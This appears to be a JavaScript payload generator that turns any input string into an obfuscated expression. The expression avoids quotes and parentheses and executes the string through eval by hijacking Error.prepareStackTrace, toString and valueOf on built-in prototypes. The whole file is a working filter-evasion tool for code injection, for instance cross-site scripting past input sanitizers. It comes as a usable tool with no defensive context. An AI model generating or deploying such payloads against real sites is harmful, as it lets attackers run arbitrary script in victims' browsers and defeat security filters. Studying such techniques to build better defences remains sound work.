
// shortcuts for the prototype strings
init_shortcuts = 'AP=Array.prototype,SP=String.prototype,EP=Error.prototype'

// initialize digits from 0 to 9
init_digits = 'x=Set,y=Set,x.toString=AP.indexOf,y.valueOf=String,a=x+++y,b=x+++y,c=x+++y,d=x+++y,e=x+++y,f=x+++y,g=x+++y,h=x+++y,i=x+++y,j=x+++y'

// prepare 
init_state = 'delete Error.name,Error.message=Array,Error.toString=EP.toString,tsb=AP.toString,AP.toString=AP.lastIndexOf,Error.prepareStackTrace=SP.split,er=new Error,er.toString=AP.join,r=er.stack,r.toString=AP.shift,y=Map,y.valueOf=AP.join,lu=r+y,lu=r+y,ln=r+y,lt=r+y,lt=r+y,spa=r+r+r+y,spa=r+y,lr=r+y,lr=r+y,po=r+r+r+y,po=r+y,pc=r+y,bro=r+r+r+y,bro=r+y,le=r+r+r+r+r+y,le=r+y,brc=r+r+r+r+r+y,brc=r+y,r.toString=tsb,Error.message=r,er=new Error,er.toString=AP.join,r=er.stack,r.toString=AP.shift,r.toString=tsb,Error.message=r,er=new Error,er.toString=AP.join,r=er.stack,r.toString=AP.shift,com=r+y,com=r+y,y.valueOf=SP.anchor,Error.message=y+y,er=new Error,er.toString=AP.join,r=er.stack,r.toString=AP.shift,y.valueOf=AP.join,quo=r+r+r+r+r+r+r+r+y,quo=r+y';

// construct the decoder payload 
payload_start = 'payload=eval.name+po+String.name+bro+quo+String.fromCharCode.name+quo+brc+po';

// eighth way to call javascript functions without params 
code_execution = 'Object.prototype.message=payload,AP.toString=EP.toString,Error.prepareStackTrace=Function,errr=new Error,errr.toString=errr.stack,result=errr+y'

function initialize_integer(number) { 
  let letters = String(number)
                          .split('')
                          .map(n=>String.fromCharCode(Number(n)+97));
  return letters.join('')+"="+letters.join("+");  
}

function int_to_var(number) {
  return String(number)
                  .split('')
                  .map(n=>String.fromCharCode(Number(n)+97))
                  .join('');
}

function generate_payload(input) { 
  
  // get unique characters from the input
  characters = input
                  .split('')
                  .filter((e, i, self) => i === self.indexOf(e));
  
  // initialize placeholders 
  init_variables = characters
                      .map(x=>x.charCodeAt(0))
                      .map(initialize_integer)
                      .join(',')
  
  // construct input string from variables
  string_construction = [payload_start,
                         input
                          .split('')
                          .map(x=>x.charCodeAt(0))
                          .map(x=>int_to_var(x))
                          .join('+com+'),
                          "pc","pc"].join('+')
  
  return [init_shortcuts,init_digits,init_state,init_variables,string_construction,code_execution].join(',')
}

